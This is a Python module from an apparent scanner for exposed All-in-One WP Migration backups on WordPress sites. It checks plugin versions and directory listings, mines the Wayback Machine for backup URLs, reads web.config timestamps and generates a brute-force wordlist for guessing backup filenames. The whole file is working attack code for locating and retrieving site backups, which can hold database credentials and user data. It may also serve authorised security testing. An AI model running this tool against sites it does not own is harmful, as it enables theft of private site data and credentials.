#!/usr/bin/python3
# -*- coding: UTF-8 -*-
"""
Common utilities for All-in-One WP Migration Backup Finder

This module provides shared functionality for finding exposed WordPress backups
from the All-in-One WP Migration plugin vulnerability.
"""

import sys
import logging
import re
from datetime import datetime, timedelta
from typing import Optional, List, Tuple, Generator
from urllib.parse import urlparse, urlunparse
from pathlib import Path

import requests
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Constants
DEFAULT_TIMEOUT = 30  # seconds
DEFAULT_USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
VULNERABLE_VERSIONS = ["7.15", "7.47"]
BACKUP_EXTENSION = ".wpress"
BACKUP_PATH = "/wp-content/ai1wm-backups/"
PLUGIN_README = "/wp-content/plugins/all-in-one-wp-migration/readme.txt"
WEB_CONFIG = "/wp-content/ai1wm-backups/web.config"

# Setup logging
logger = logging.getLogger(__name__)


class WPMigrationScanner:
    """Scanner for All-in-One WP Migration backup files."""

    def __init__(self, url: str, verify_ssl: bool = False, timeout: int = DEFAULT_TIMEOUT,
                 verbose: bool = False):
        """
        Initialize the scanner.

        Args:
            url: Target WordPress URL
            verify_ssl: Whether to verify SSL certificates
            timeout: Request timeout in seconds
            verbose: Enable verbose logging
        """
        self.url = self._normalize_url(url)
        self.verify_ssl = verify_ssl
        self.timeout = timeout
        self.session = requests.Session()
        self.headers = {
            "User-Agent": DEFAULT_USER_AGENT,
            "Connection": "close",
            "Accept": "*/*"
        }

        # Configure logging
        log_level = logging.DEBUG if verbose else logging.INFO
        logging.basicConfig(
            level=log_level,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )

        if not verify_ssl:
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

    @staticmethod
    def _normalize_url(url: str) -> str:
        """
        Normalize and validate URL.

        Args:
            url: URL to normalize

        Returns:
            Normalized URL

        Raises:
            ValueError: If URL is invalid
        """
        if not url:
            raise ValueError("URL cannot be empty")

        # Add scheme if missing
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url

        # Parse and validate
        parsed = urlparse(url)
        if not parsed.netloc:
            raise ValueError(f"Invalid URL: {url}")

        # Remove trailing slash
        url = url.rstrip('/')

        # Validate domain format
        domain_pattern = re.compile(
            r'^(?:[a-zA-Z0-9]'  # First character
            r'(?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)'  # Subdomain
            r'+[a-zA-Z]{2,}$'  # TLD
        )
        if not domain_pattern.match(parsed.netloc.split(':')[0]):
            logger.warning(f"URL domain format may be invalid: {parsed.netloc}")

        return url

    def _make_request(self, path: str, method: str = 'GET',
                     follow_redirects: bool = True) -> Optional[requests.Response]:
        """
        Make HTTP request with error handling.

        Args:
            path: URL path to request
            method: HTTP method
            follow_redirects: Whether to follow redirects

        Returns:
            Response object or None on error
        """
        url = self.url + path
        try:
            logger.debug(f"{method} {url}")
            response = self.session.request(
                method=method,
                url=url,
                headers=self.headers,
                verify=self.verify_ssl,
                timeout=self.timeout,
                allow_redirects=follow_redirects
            )
            return response
        except requests.exceptions.Timeout:
            logger.error(f"Request timeout: {url}")
            return None
        except requests.exceptions.ConnectionError:
            logger.error(f"Connection error: {url}")
            return None
        except requests.exceptions.RequestException as e:
            logger.error(f"Request failed: {e}")
            return None

    def check_version(self) -> bool:
        """
        Check if the WordPress plugin version is vulnerable.

        Returns:
            True if vulnerable, False otherwise
        """
        logger.info("Checking plugin version...")
        response = self._make_request(PLUGIN_README)

        if not response or response.status_code != 200:
            logger.warning("Could not retrieve plugin version information")
            return True  # Assume vulnerable if can't determine

        # Check for non-vulnerable versions
        for version in VULNERABLE_VERSIONS:
            if version in response.text:
                logger.warning(f"Found non-vulnerable version {version}")
                return False

        logger.info("Version appears to be vulnerable")
        return True

    def check_directory_listing(self) -> Optional[str]:
        """
        Check if backup directory has directory listing enabled.

        Returns:
            URL if exposed, None otherwise
        """
        logger.info("Checking for exposed backup directory...")
        response = self._make_request(BACKUP_PATH)

        if response and response.status_code == 200 and BACKUP_EXTENSION in response.text:
            logger.warning("Directory listing is enabled!")
            return self.url + BACKUP_PATH

        return None

    def check_multipart_response(self) -> List[str]:
        """
        Check for multipart response with multiple backups.

        Returns:
            List of backup URLs found
        """
        logger.info("Checking for multiple backups...")
        domain = urlparse(self.url).netloc
        response = self._make_request(BACKUP_PATH + domain + "-")

        backups = []
        if response and response.status_code == 300:
            soup = BeautifulSoup(response.text, "html.parser")
            for link in soup.findAll('a'):
                href = link.get('href')
                if href:
                    backup_url = self.url + href
                    backups.append(backup_url)
                    logger.info(f"Found backup: {backup_url}")

        return backups

    def check_wayback_machine(self) -> List[str]:
        """
        Check Wayback Machine for archived backup URLs.

        Returns:
            List of potential backup URLs from Wayback Machine
        """
        logger.info("Checking Wayback Machine...")
        wayback_url = (
            f"http://web.archive.org/cdx/search/cdx?"
            f"url={self.url}*&output=txt&fl=original&collapse=urlkey"
        )

        try:
            response = requests.get(
                wayback_url,
                headers=self.headers,
                verify=self.verify_ssl,
                timeout=self.timeout
            )

            if response.status_code == 200 and "wp-content/ai1wm-backups" in response.text:
                logger.info("Found potential backup URLs in Wayback Machine")
                backups = []
                # Fix: iterate over lines, not bytes
                for line in response.text.split('\n'):
                    if BACKUP_EXTENSION in line:
                        backups.append(line.strip())
                        logger.debug(f"Wayback URL: {line.strip()}")
                return backups

        except requests.exceptions.RequestException as e:
            logger.warning(f"Could not access Wayback Machine: {e}")

        return []

    def get_backup_timestamp(self) -> Optional[datetime]:
        """
        Get the backup timestamp from web.config file.

        Returns:
            Timestamp or None if not found
        """
        logger.info("Retrieving backup timestamp...")
        response = self._make_request(WEB_CONFIG)

        if not response or response.status_code != 200:
            logger.warning("Could not retrieve web.config")
            return None

        if BACKUP_EXTENSION not in response.text:
            logger.warning("No backup references found in web.config")
            return None

        last_modified = response.headers.get('last-modified')
        if not last_modified:
            logger.warning("No Last-Modified header found")
            return None

        try:
            timestamp = datetime.strptime(last_modified, "%a, %d %b %Y %H:%M:%S %Z")
            logger.info(f"Backup timestamp: {timestamp}")
            return timestamp
        except ValueError as e:
            logger.error(f"Could not parse timestamp: {e}")
            return None

    def generate_payload(self, timestamp: datetime, delta_minutes: int = 10,
                        output_file: str = "timerange.txt") -> Tuple[str, int]:
        """
        Generate time-based payload file for brute-forcing.

        Args:
            timestamp: Base timestamp for backup
            delta_minutes: Minutes before/after timestamp to check
            output_file: Output payload file path

        Returns:
            Tuple of (output_file_path, number_of_entries)
        """
        logger.info(f"Generating payload with ±{delta_minutes} minute range...")

        time_min = timestamp - timedelta(minutes=delta_minutes)
        time_max = timestamp + timedelta(minutes=delta_minutes)

        count = 0
        # Use context manager to properly close file
        with open(output_file, 'w') as f:
            for dt in self._datetime_range(time_min, time_max, timedelta(seconds=1)):
                time_str = dt.strftime('%H%M%S')
                for suffix in range(100, 1000):  # 100-999
                    f.write(f"{time_str}-{suffix}\n")
                    count += 1

        logger.info(f"Generated {count} entries in {output_file}")
        return output_file, count

    @staticmethod
    def _datetime_range(start: datetime, end: datetime,
                       delta: timedelta) -> Generator[datetime, None, None]:
        """
        Generate datetime range.

        Args:
            start: Start datetime
            end: End datetime
            delta: Step size

        Yields:
            datetime objects in range
        """
        current = start
        while current < end:
            yield current
            current += delta

    def get_final_url(self) -> str:
        """
        Get final URL after following redirects.

        Returns:
            Final URL
        """
        response = self._make_request("", follow_redirects=True)
        if response and response.url:
            # Remove trailing slash and normalize
            return response.url.rstrip('/')
        return self.url

    def get_domain(self) -> str:
        """
        Extract domain from URL.

        Returns:
            Domain name
        """
        final_url = self.get_final_url()
        return urlparse(final_url).netloc

    def check_server_status(self) -> bool:
        """
        Check if server is reachable.

        Returns:
            True if server is reachable
        """
        logger.info(f"Checking server status: {self.url}")
        response = self._make_request("")

        if not response:
            logger.error("Server is not reachable")
            return False

        if response.status_code == 403:
            logger.error("Server returned 403 Forbidden (possible WAF)")
            return False

        if response.status_code == 401:
            logger.error("Server returned 401 Unauthorized")
            return False

        logger.info(f"Server is reachable (status: {response.status_code})")
        return True


def validate_tool_installed(tool_name: str) -> bool:
    """
    Check if external tool is installed.

    Args:
        tool_name: Name of the tool to check

    Returns:
        True if tool is installed
    """
    import shutil
    return shutil.which(tool_name) is not None
